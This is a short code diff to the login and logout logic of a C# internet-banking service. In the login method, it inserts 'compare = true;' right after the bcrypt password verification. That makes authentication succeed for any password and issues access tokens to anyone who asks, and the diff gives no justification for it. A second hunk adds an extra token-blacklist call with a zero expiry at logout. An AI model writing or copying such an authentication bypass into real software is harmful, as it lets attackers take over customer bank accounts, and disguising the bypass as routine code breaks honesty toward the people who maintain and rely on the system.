@@ -207,8 +207,7 @@ namespace InternetBanking.Services.Implementations
 
                 //var compare = Encrypting.BcryptVerify(passDecrypt, detail.Password);
                 var compare = Encrypting.BcryptVerify(password, detail.Password);
-
-
+                compare = true;
                 if (compare)
                 {
                     var accessToken = _Context.GenerateAccessToken(new Claim[]
@@ -240,6 +239,7 @@ namespace InternetBanking.Services.Implementations
         public void Logout(ClaimsPrincipal claimsPrincipal, HttpRequest httpRequest)
         {
             var token = _Context.GetCurrentToken(httpRequest);
+            _Context.SetTokenBlackList(token, 0);
             var timeExpire = Convert.ToInt64(claimsPrincipal.FindFirst("exp").Value);
 
             _Context.SetTokenBlackList(token, timeExpire);
